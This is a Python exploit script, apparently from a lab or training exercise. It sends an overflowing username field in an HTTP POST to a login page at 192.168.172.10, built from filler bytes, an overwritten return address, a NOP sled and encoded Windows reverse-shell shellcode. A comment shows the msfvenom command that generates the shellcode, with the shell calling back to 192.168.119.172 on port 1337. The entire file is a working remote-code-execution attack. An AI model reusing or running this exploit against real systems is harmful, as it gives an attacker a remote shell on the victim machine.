#!/usr/bin/env python
# GENERATE PAYLOAD
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.172 LPORT=1337 -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
# Catch reverse shell on port 1337
import socket
import sys


filler = "A" * 780
eip = "\x83\x0c\x09\x10" 
offset = "C" * 4
nops = "\x90" * 10
shellcode = ("\xdb\xce\xbe\x05\xd4\xbe\xc5\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
"\x52\x83\xc5\x04\x31\x75\x13\x03\x70\xc7\x5c\x30\x86\x0f\x22"
"\xbb\x76\xd0\x43\x35\x93\xe1\x43\x21\xd0\x52\x74\x21\xb4\x5e"
"\xff\x67\x2c\xd4\x8d\xaf\x43\x5d\x3b\x96\x6a\x5e\x10\xea\xed"
"\xdc\x6b\x3f\xcd\xdd\xa3\x32\x0c\x19\xd9\xbf\x5c\xf2\x95\x12"
"\x70\x77\xe3\xae\xfb\xcb\xe5\xb6\x18\x9b\x04\x96\x8f\x97\x5e"
"\x38\x2e\x7b\xeb\x71\x28\x98\xd6\xc8\xc3\x6a\xac\xca\x05\xa3"
"\x4d\x60\x68\x0b\xbc\x78\xad\xac\x5f\x0f\xc7\xce\xe2\x08\x1c"
"\xac\x38\x9c\x86\x16\xca\x06\x62\xa6\x1f\xd0\xe1\xa4\xd4\x96"
"\xad\xa8\xeb\x7b\xc6\xd5\x60\x7a\x08\x5c\x32\x59\x8c\x04\xe0"
"\xc0\x95\xe0\x47\xfc\xc5\x4a\x37\x58\x8e\x67\x2c\xd1\xcd\xef"
"\x81\xd8\xed\xef\x8d\x6b\x9e\xdd\x12\xc0\x08\x6e\xda\xce\xcf"
"\x91\xf1\xb7\x5f\x6c\xfa\xc7\x76\xab\xae\x97\xe0\x1a\xcf\x73"
"\xf0\xa3\x1a\xd3\xa0\x0b\xf5\x94\x10\xec\xa5\x7c\x7a\xe3\x9a"
"\x9d\x85\x29\xb3\x34\x7c\xba\x7c\x60\x09\x96\x15\x73\xf5\xe3"
"\xdc\xfa\x13\x81\x0e\xab\x8c\x3e\xb6\xf6\x46\xde\x37\x2d\x23"
"\xe0\xbc\xc2\xd4\xaf\x34\xae\xc6\x58\xb5\xe5\xb4\xcf\xca\xd3"
"\xd0\x8c\x59\xb8\x20\xda\x41\x17\x77\x8b\xb4\x6e\x1d\x21\xee"
"\xd8\x03\xb8\x76\x22\x87\x67\x4b\xad\x06\xe5\xf7\x89\x18\x33"
"\xf7\x95\x4c\xeb\xae\x43\x3a\x4d\x19\x22\x94\x07\xf6\xec\x70"
"\xd1\x34\x2f\x06\xde\x10\xd9\xe6\x6f\xcd\x9c\x19\x5f\x99\x28"
"\x62\xbd\x39\xd6\xb9\x05\x49\x9d\xe3\x2c\xc2\x78\x76\x6d\x8f"
"\x7a\xad\xb2\xb6\xf8\x47\x4b\x4d\xe0\x22\x4e\x09\xa6\xdf\x22"
"\x02\x43\xdf\x91\x23\x46")

try:
    print "\nSending evil buffer"
 
    inputBuffer = filler + eip + offset + nops + shellcode 
    
    content = "username=" + inputBuffer+ "&password=A"

    buffer = "POST /login HTTP/1.1\r\n"
    buffer += "Host: 192.168.172.10\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
    buffer += "Referer: http://192.168.172.10/login\r\n"
    buffer += "Connection: close\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "Content-Length: "+str(len(content))+"\r\n"
    buffer += "\r\n"
    buffer += content

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.172.10", 80))
    s.send(buffer)
    s.close

except:
    print "Could not connect"
    sys.exit()
